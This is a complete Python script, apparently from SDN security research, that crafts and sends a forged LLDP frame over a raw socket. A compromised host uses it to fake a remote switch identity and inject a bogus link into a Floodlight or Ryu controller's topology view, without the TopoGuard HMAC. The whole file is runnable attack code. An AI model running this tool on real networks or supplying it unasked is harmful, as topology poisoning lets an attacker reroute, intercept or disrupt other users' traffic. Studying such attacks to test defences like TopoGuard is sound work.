#!/usr/bin/env python3
"""Craft and send a targeted forged LLDP frame from an edge host port.

Attack model:
- A compromised host on an access port forges LLDP with a fake source switch/port
  identity (remote DPID/port TLV) to fabricate a link in controller topology view.
- The attacker does not know TopoGuard HMAC secret, so MAC TLV is omitted by default.

Example:
    python3 send_fake_lldp.py h1-eth0 --remote-dpid 2 --remote-port 2
"""

from __future__ import annotations

import argparse
import socket
import struct
import sys

ETH_TYPE_LLDP = 0x88CC
LLDP_DST_MAC = "01:80:c2:00:00:0e"


def mac_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def parse_dpid(value: str) -> int:
    # Accept decimal ("2") or hex ("0x2").
    return int(value, 0)


def build_tlv(tlv_type: int, value: bytes) -> bytes:
    header = ((tlv_type & 0x7F) << 9) | (len(value) & 0x1FF)
    return struct.pack("!H", header) + value


def build_forged_lldp(remote_dpid: int, remote_port: int) -> bytes:
    # Chassis/port values are attacker-controlled; they need only be syntactically valid.
    chassis = bytes([4]) + b"\x11\x22\x33\x44\x55\x66"
    port_id = bytes([2]) + struct.pack("!H", remote_port)
    ttl = struct.pack("!H", 120)

    # Match Floodlight/Ryu OpenFlow OUI style TLV used by link discovery.
    remote_dpid_tlv = b"\x00\x26\xe1\x00" + remote_dpid.to_bytes(8, byteorder="big")

    # Attacker can inject bogus controller-id and direction TLVs.
    fake_controller_id = b"\x12\x34\x56\x78\x9a\xbc\xde\xf0"
    direction_forward = b"\x01"

    payload = b"".join(
        [
            build_tlv(1, chassis),
            build_tlv(2, port_id),
            build_tlv(3, ttl),
            build_tlv(127, remote_dpid_tlv),
            build_tlv(0x0C, fake_controller_id),
            build_tlv(0x73, direction_forward),
            b"\x00\x00",
        ]
    )

    return payload


def main() -> int:
    parser = argparse.ArgumentParser(description="Send targeted forged LLDP frame")
    parser.add_argument("iface", help="Interface to send from (e.g., h1-eth0)")
    parser.add_argument("--remote-dpid", required=True, type=parse_dpid, help="Forged remote switch DPID")
    parser.add_argument("--remote-port", required=True, type=int, help="Forged remote switch port")
    args = parser.parse_args()

    try:
        with open(f"/sys/class/net/{args.iface}/address", "r", encoding="utf-8") as f:
            src_mac = f.read().strip()
    except OSError as exc:
        print(f"failed to read source mac for {args.iface}: {exc}", file=sys.stderr)
        return 1

    payload = build_forged_lldp(args.remote_dpid, args.remote_port)
    frame = mac_to_bytes(LLDP_DST_MAC) + mac_to_bytes(src_mac) + struct.pack("!H", ETH_TYPE_LLDP) + payload

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    try:
        sock.bind((args.iface, 0))
        sock.send(frame)
    except OSError as exc:
        print(f"send failed on {args.iface}: {exc}", file=sys.stderr)
        return 1
    finally:
        sock.close()

    print(
        "sent forged LLDP on "
        f"{args.iface} pretending remote_dpid={args.remote_dpid} remote_port={args.remote_port}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
